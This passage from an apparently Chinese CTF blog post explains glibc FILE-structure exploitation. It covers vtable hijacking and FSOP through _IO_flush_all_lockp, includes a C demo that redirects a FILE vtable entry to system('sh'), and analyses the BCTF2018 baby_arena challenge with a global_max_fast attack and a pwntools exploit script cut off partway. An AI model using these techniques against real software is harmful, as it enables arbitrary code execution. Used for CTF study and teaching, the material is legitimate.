结构体串联起来。值得注意的是通过河里的改写该指针，可以达到伪造 _IO_FILE 结构体的作用，为进一步的 🐑 做准备。</p><p>常用手法是 unsortdebin，Largebin 等 Attack 打 global_max_fast 改大 fastbin 的最大 size，在 _IO_list_all 写堆地址，当然直接对 _IO_list_all 冻手也是可以的，详细的后面会有例题。</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/posts/20190627090036-f9501556-9876-1.png" alt=""></p><h2 id="IO调用的vtable函数"><a class="header-anchor" href="#IO调用的vtable函数">¶</a>IO调用的vtable函数</h2><p>在这里给出 <strong>raycp</strong> 师傅总结出的 <code>fopen</code>、<code>fread</code>、<code>fwrite</code>、<code>fclose</code>四个函数会调用的vtable函数。没错，我直接 CV 大师 👦，记不记得下来我不知道，以后起码翻起来方便很多。</p><p>fopen函数是在分配空间，建立FILE结构体，未调用vtable中的函数。</p><p>fread函数中调用的vtable函数有：</p><ul><li><code>_IO_sgetn</code>函数调用了vtable的<code>_IO_file_xsgetn</code>。</li><li><code>_IO_doallocbuf</code>函数调用了vtable的<code>_IO_file_doallocate</code>以初始化输入缓冲区。</li><li>vtable中的<code>_IO_file_doallocate</code>调用了vtable中的<code>__GI__IO_file_stat</code>以获取文件信息。</li><li><code>__underflow</code>函数调用了vtable中的<code>_IO_new_file_underflow</code>实现文件数据读取。</li><li>vtable中的<code>_IO_new_file_underflow</code>调用了vtable<code>__GI__IO_file_read</code>最终去执行系统调用read。</li></ul><p>fwrite 函数调用的vtable函数有：</p><ul><li><code>_IO_fwrite</code>函数调用了vtable的<code>_IO_new_file_xsputn</code>。</li><li><code>_IO_new_file_xsputn</code>函数调用了vtable中的<code>_IO_new_file_overflow</code>实现缓冲区的建立以及刷新缓冲区。</li><li>vtable中的<code>_IO_new_file_overflow</code>函数调用了vtable的<code>_IO_file_doallocate</code>以初始化输入缓冲区。</li><li>vtable中的<code>_IO_file_doallocate</code>调用了vtable中的<code>__GI__IO_file_stat</code>以获取文件信息。</li><li><code>new_do_write</code>中的<code>_IO_SYSWRITE</code>调用了vtable<code>_IO_new_file_write</code>最终去执行系统调用write。</li></ul><p><code>fclose</code>函数调用的vtable函数有：</p><ul><li>在清空缓冲区的<code>_IO_do_write</code>函数中会调用vtable中的函数。</li><li>关闭文件描述符<code>_IO_SYSCLOSE</code>函数为vtable中的<code>__close</code>函数。</li><li><code>_IO_FINISH</code>函数为vtable中的<code>__finish</code>函数。</li></ul><p>当然，IO 函数远不止这些。其他的 IO 函数内还有很多函数指针被调用了，被各位师傅们发掘出来的已经成了各大 <code>House</code> 了，剩下的只能说随缘看到了就看看能不能利用。</p><h2 id="FSOP-File-Stream-Oriented-Programming"><a class="header-anchor" href="#FSOP-File-Stream-Oriented-Programming">¶</a>FSOP(File Stream Oriented Programming)</h2><p><strong>FSOP</strong> 贯穿整个 IO 利用，👴 印象中带 OP 俩字不是 <strong>O泡</strong> 就是 <strong>导向编程</strong>。排除法得 FSOP 是可以实现类似 ROP 一样的<strong>控制流劫持</strong>的。</p><p><strong>FSOP</strong> 主要利用了 <strong>_IO_flush_all_lockp</strong> 函数，该函数的功能是刷新所有FILE结构体的输出缓冲区，先放一段代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span><br>_IO_flush_all_lockp (<span class="hljs-type">int</span> do_lock)<br>&#123;<br>  <span class="hljs-type">int</span> result = <span class="hljs-number">0</span>;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *<span class="hljs-title">fp</span>;</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>  _IO_cleanup_region_start_noarg (flush_cleanup);<br>  _IO_lock_lock (list_all_lock);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>#遍历 _IO_list_all<br>  <span class="hljs-title function_">for</span> <span class="hljs-params">(fp = (_IO_FILE *) _IO_list_all; fp != <span class="hljs-literal">NULL</span>; fp = fp-&gt;_chain)</span><br>    &#123;<br>      run_fp = fp;<br>      <span class="hljs-keyword">if</span> (do_lock)<br>_IO_flockfile (fp);<br><br>      <span class="hljs-keyword">if</span> (((fp-&gt;_mode &lt;= <span class="hljs-number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)<br>   || (_IO_vtable_offset (fp) == <span class="hljs-number">0</span><br>       &amp;&amp; fp-&gt;_mode &gt; <span class="hljs-number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr<br>    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))<br>   )<br>  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)<span class="hljs-comment">//如果输出缓冲区有数据，刷新输出缓冲区</span><br>result = EOF;<br><br>      <span class="hljs-keyword">if</span> (do_lock)<br>_IO_funlockfile (fp);<br>      run_fp = <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>  _IO_lock_unlock (list_all_lock);<br>  _IO_cleanup_region_end (<span class="hljs-number">0</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到关键在于它这里<strong>遍历</strong>了 <strong>_IO_list_all</strong> ，且调用了 <strong>_IO_OVERFLOW</strong> 这个 <strong>vtable</strong> 里面的函数。通过劫持这个函数，我们就可以玩一系列的操作。一般思路是在可控区域伪造一个结构体，塞入 <strong>_IO_list_all</strong> 这个链表里面（🐑 其他结构体的 <strong>_chain</strong> 指针或者直接 🐑 _IO_list_all 指针）。然后在伪造的结构体处劫持 vtable。</p><p>事实上，会<code>_IO_flush_all_lockp</code>调用函数的时机包括：</p><ul><li>libc执行abort函数时（内存错误）。别的师傅有写到 <strong>libc &lt; 2.26</strong> 有效，没具体试过。但是我们可以选择打 <strong>Kiwi</strong>。</li><li>程序显式调用 exit 函数时，<code>_exit</code> 不行。但是我们可以打 <strong>Kiwi</strong>。</li><li>程序从main函数返回时，结束时直接调 <code>syscall</code> 也不行。但是我们可以打 <strong>Kiwi</strong>。</li></ul><p>拿一张 CTF-Wiki 的图，虽然打印出了报错信息，还是执行了 <strong>_IO_OVERFLOW</strong> 这个函数。所以一顿操作直接打出了错误信息的同时<code>getshell</code> 或者 <code>orw flag</code> 都是基槽。</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/abort_routine.001.jpeg" alt=""></p><p>看下上述三种情况的堆栈，来进一步了解程序的流程。将断点下在<code>_IO_flush_all_lockp</code>，查看栈结构。</p><h3 id="Abort-栈回溯"><a class="header-anchor" href="#Abort-栈回溯">¶</a>Abort 栈回溯</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_flush_all_lockp (do_lock=do_lock@entry=<span class="hljs-number">0x0</span>)<br>__GI_abort ()<br>__libc_message (do_abort=do_abort@entry=<span class="hljs-number">0x2</span>, fmt=fmt@entry=<span class="hljs-number">0x7ffff7ba0d58</span> <span class="hljs-string">&quot;*** Error in `%s&#x27;: %s: 0x%s ***\n&quot;</span>)<br>malloc_printerr (action=<span class="hljs-number">0x3</span>, str=<span class="hljs-number">0x7ffff7ba0e90</span> <span class="hljs-string">&quot;double free or corruption (top)&quot;</span>, ptr=&lt;optimized out&gt;, ar_ptr=&lt;optimized out&gt;)<br>_int_free (av=<span class="hljs-number">0x7ffff7dd4b20</span> &lt;main_arena&gt;, p=&lt;optimized out&gt;,have_lock=<span class="hljs-number">0x0</span>)<br>main ()<br>__libc_start_main (main=<span class="hljs-number">0x400566</span> &lt;main&gt;, argc=<span class="hljs-number">0x1</span>, argv=<span class="hljs-number">0x7fffffffe578</span>, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=<span class="hljs-number">0x7fffffffe568</span>)<br>_start ()<br></code></pre></td></tr></table></figure><h3 id="exit-栈回溯"><a class="header-anchor" href="#exit-栈回溯">¶</a>exit 栈回溯</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_flush_all_lockp (do_lock=do_lock@entry=<span class="hljs-number">0x0</span>)<br>_IO_cleanup ()<br>__run_exit_handlers (status=<span class="hljs-number">0x0</span>, listp=&lt;optimized out&gt;, run_list_atexit=run_list_atexit@entry=<span class="hljs-number">0x1</span>)<br>__GI_exit (status=&lt;optimized out&gt;)<br>main ()<br>__libc_start_main (main=<span class="hljs-number">0x400566</span> &lt;main&gt;, argc=<span class="hljs-number">0x1</span>, argv=<span class="hljs-number">0x7fffffffe578</span>, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=<span class="hljs-number">0x7fffffffe568</span>)<br>_start ()<br></code></pre></td></tr></table></figure><h3 id="正常退出栈回溯"><a class="header-anchor" href="#正常退出栈回溯">¶</a>正常退出栈回溯</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_flush_all_lockp (do_lock=do_lock@entry=<span class="hljs-number">0x0</span>)<br>_IO_cleanup ()<br>__run_exit_handlers (status=<span class="hljs-number">0x0</span>, listp=&lt;optimized out&gt;, run_list_atexit=run_list_atexit@entry=<span class="hljs-number">0x1</span>)<br>__GI_exit (status=&lt;optimized out&gt;)<br>__libc_start_main (main=<span class="hljs-number">0x400526</span> &lt;main&gt;, argc=<span class="hljs-number">0x1</span>, argv=<span class="hljs-number">0x7fffffffe578</span>, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=<span class="hljs-number">0x7fffffffe568</span>)<br>_start ()<br></code></pre></td></tr></table></figure><p>看出来程序是在<strong>正常从main函数返回后</strong>，调用了<code>exit</code>函数，所以最终才调用<code>_IO_flush_all_lockp</code>函数的。所以如果用 <code>syscall</code> 结束那就不行。</p><p>常见的利用的方式为——</p><p>伪造IO FILE结构体，并利用漏洞将<code>_IO_list_all</code>指向伪造的结构体，或是将该链表中的一个节点（<code>_chain</code>字段）指向伪造的数据，再或者直接 🐑 掉原本的 IO 结构体。</p><p>最终触发<code>_IO_flush_all_lockp</code>，我们精心构造结构体绕过一堆检查，调用<code>_IO_OVERFLOW</code> 等函数时实现执行<strong>流劫持</strong>。意思是你可以合法地构造多个 <strong>_chain</strong> 把 IO <strong>摁在 exit 等函数退出前反复摩擦</strong>（笑）。 👴 就是爱了这一点。</p><p>其中绕过检查进入<code>_IO_OVERFLOW</code>的条件是输出缓冲区中存在数据：</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xl"> <span class="hljs-function"><span class="hljs-title">if</span> (((fp-&gt;</span>_<span class="hljs-function"><span class="hljs-title">mode</span> &lt;= 0 &amp;&amp; fp-&gt;</span>_IO_<span class="hljs-function"><span class="hljs-title">write_ptr</span> &gt; fp-&gt;</span>_IO_write_base)<br>#<span class="hljs-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T<br>     || (_IO_vtable_offset (fp) == <span class="hljs-number">0</span><br>         &amp;&amp; <span class="hljs-function"><span class="hljs-title">fp</span>-&gt;</span>_<span class="hljs-function"><span class="hljs-title">mode</span> &gt; 0 &amp;&amp; (fp-&gt;</span>_<span class="hljs-function"><span class="hljs-title">wide_data</span>-&gt;</span>_IO_write_ptr<br>            &gt; <span class="hljs-function"><span class="hljs-title">fp</span>-&gt;</span>_<span class="hljs-function"><span class="hljs-title">wide_data</span>-&gt;</span>_IO_write_base))<br></code></pre></td></tr></table></figure><p>这个伪造的话，我们只需要如下操作就可以绕过：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">fp-&gt;_mode &lt;= <span class="hljs-number">0</span><br>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base<br></code></pre></td></tr></table></figure><hr><h1>利用艺术鉴赏</h1><h2 id="Libc-2-23"><a class="header-anchor" href="#Libc-2-23">¶</a>Libc &lt;= 2.23</h2><h3 id="劫持-vtable"><a class="header-anchor" href="#劫持-vtable">¶</a>劫持 vtable</h3><p>这个很好理解，上面有说到 vtable 是一张不寻常的表，很多 io 相关函数都会调用它。那么 👴 只要劫持了 vtable， 🐑 掉某个 IO 函数中关键的函数指针，换成 👴 最爱的 system ，就能搞事情了。</p><h4 id="Demo"><a class="header-anchor" href="#Demo">¶</a>Demo</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> system_ptr 0x7ffff7a52390;</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    FILE *fp;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *vtable_addr,*fake_vtable;<br><br>    fp=fopen(<span class="hljs-string">&quot;123.txt&quot;</span>,<span class="hljs-string">&quot;rw&quot;</span>);<br>    fake_vtable=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x40</span>);<br><br>    vtable_addr=(<span class="hljs-type">long</span> <span class="hljs-type">long</span> *)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)fp+<span class="hljs-number">0xd8</span>);     <span class="hljs-comment">//vtable offset</span><br><br>    vtable_addr[<span class="hljs-number">0</span>]=(<span class="hljs-type">long</span> <span class="hljs-type">long</span>)fake_vtable;<br><br>    <span class="hljs-built_in">memcpy</span>(fp,<span class="hljs-string">&quot;sh&quot;</span>,<span class="hljs-number">3</span>);<br><br>    fake_vtable[<span class="hljs-number">7</span>]=system_ptr; <span class="hljs-comment">//xsputn</span><br><br>    fwrite(<span class="hljs-string">&quot;hi&quot;</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,fp);<br>&#125;<br></code></pre></td></tr></table></figure><p>这个直接扬完了是因为 fwrite 调用了<code>_IO_new_file_xsputn</code> 这个函数，而 rdi 默认就是我们的 fp 结构体，所以最后的效果是 <code>system('sh\0');</code>。</p><h3 id="例题"><a class="header-anchor" href="#例题">¶</a>例题</h3><h4 id="baby-arena-BCTF2018-libc2-23"><a class="header-anchor" href="#baby-arena-BCTF2018-libc2-23">¶</a>baby_arena_BCTF2018 &lt;libc2.23&gt;</h4><p>题目可以<a href="https://github.com/caffelne/caffelne.github.io/tree/master/chals/IOFILE/baby_arena_BCTF2018">点击</a>下载或者去原文 <a href="https://fmyy.pro/2020/04/04/GMF/Global_Max_Fast/">肥猫嘤嘤’s 博客</a></p><h5 id="分析"><a class="header-anchor" href="#分析">¶</a>分析</h5><p>第一题就写详细点。菜单实现了 <code>allocate</code> ，<code>delete</code> ，<code>login</code> 三个功能。</p><p>漏洞点函数 <strong>login</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">login</span><span class="hljs-params">()</span><br>&#123;<br>  __int64 *v0; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">int</span> num; <span class="hljs-comment">// eax</span><br>  __int64 v3; <span class="hljs-comment">// [rsp+0h] [rbp-10h] BYREF</span><br>  __int64 *v4; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v4 = &amp;user;<br>  <span class="hljs-keyword">if</span> ( flag )<br>  &#123;<br>    LODWORD(v0) = <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;you are already login&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    flag = <span class="hljs-number">1</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Please input your name&quot;</span>);<br>    get_char(&amp;v3, <span class="hljs-number">16LL</span>);<br>    user = v3;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;choice type&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;0.clientele&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1.admin&quot;</span>);<br>    num = get_num(<span class="hljs-string">&quot;1.admin&quot;</span>, <span class="hljs-number">16LL</span>);<br>    <span class="hljs-keyword">if</span> ( num )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( num != <span class="hljs-number">1</span> )<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>      v0 = v4 + <span class="hljs-number">1</span>;<br>      *((_DWORD *)v4 + <span class="hljs-number">2</span>) = <span class="hljs-string">&#x27;imda&#x27;</span>;<br>      *((_WORD *)v0 + <span class="hljs-number">2</span>) = <span class="hljs-string">&#x27;n&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      v0 = v4 + <span class="hljs-number">1</span>;<br>      v4[<span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;letneilc&#x27;</span>;<br>      *((_WORD *)v0 + <span class="hljs-number">4</span>) = <span class="hljs-string">&#x27;e&#x27;</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> (<span class="hljs-type">int</span>)v0;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里有个溢出，可以覆写 v4 ，导致任意地址写 <code>admin</code> 或者 <code>clientele</code> 。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">get_char(&amp;v3, <span class="hljs-number">16LL</span>);<br></code></pre></td></tr></table></figure><h5 id="Global-Max-Fast"><a class="header-anchor" href="#Global-Max-Fast">¶</a>Global_Max_Fast</h5><p>这里也顺带讲一下 <code>Global_Max_Fast</code> 这个玩意，x64 下这个东西通常为 <code>0x80</code> ，也就是我们平时看到的最大 fastbin 的大小。</p><p>利用点就在我们 free  🐑 掉一个 fastbin 范围内的堆块时，在 <strong>main_arena</strong> 的对应 size 的坑位会记录堆块的地址。但我们大小改的巨大的时候，坑位不够但是 glibc 这个笨比它又不懂，就会造成把 <strong>main_arena</strong> 往后的对应偏移位置的内容<strong>写成我们的堆块地址</strong>。</p><p>我们使用以下公式来计算出目标溢出位置，对应的需要构造的堆块 SIZE，其中的 delta 指的是溢出位置到 fastbinsY 首地址的差值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">chunk size = (delta * <span class="hljs-number">2</span>) + <span class="hljs-number">0x20</span><br></code></pre></td></tr></table></figure><p>我们需要 malloc 的大小：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">offset2size</span>(<span class="hljs-params">offset</span>):<br>    <span class="hljs-keyword">assert</span> offset % <span class="hljs-number">8</span> == <span class="hljs-number">0</span><br>    <span class="hljs-keyword">return</span> (offset * <span class="hljs-number">2</span>) + <span class="hljs-number">0x10</span><br></code></pre></td></tr></table></figure><p>👴 愿称之为<strong>霸占你的坑位然后疯狂塞💩</strong>。无图言鸾：</p><p>一开始还没 free 的时候是这样的：</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220524175248002.png" alt="image-20220524175248002"></p><p>free 完之后是这样的：</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220524175336933.png" alt="image-20220524175336933"></p><p>溢出的情形，调试部分再写。</p><h5 id="思路"><a class="header-anchor" href="#思路">¶</a>思路</h5><ol><li>简单的 Leak libc 之后利用任意写在 <code>global_max_fast</code> 上写 <code>admin</code>  改大我们的 fastbin 大小。</li><li>算好偏移把我们的堆块送到 <code>_IO_list_all</code> 的坑上去，伪造 <code>_IO_FILE</code> 的 <strong>vtable</strong> 后 <code>exit</code> 触发 <code>FSOP</code> 就结束了。需要注意的是 vtable 是一张函数表，我们为了简单的定位我们需要的函数。选择利用 <strong>login</strong> 函数同时在 bss 段写上 onegadget。</li><li>这部分并不复杂,具体的我写在下面的调试步骤了。</li></ol><h5 id="Exp"><a class="header-anchor" href="#Exp">¶</a>Exp</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.23/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./baby_arena&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;./baby_arena&#x27;</span>)<br>debug()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">choice</span>):<br>    sla(<span class="hljs-string">&#x27;4.exit\n&#x27;</span>,<span class="hljs-built_in">str</span>(choice))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,data=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    menu(<span class="hljs-number">1</span>)<br>    sla(<span class="hljs-string">&#x27;your note size&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sla(<span class="hljs-string">&#x27;Input your note&#x27;</span>,<span class="hljs-built_in">str</span>(data))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">2</span>)<br>    sla(<span class="hljs-string">&#x27;Input id:&#x27;</span>,<span class="hljs-built_in">str</span>(<span 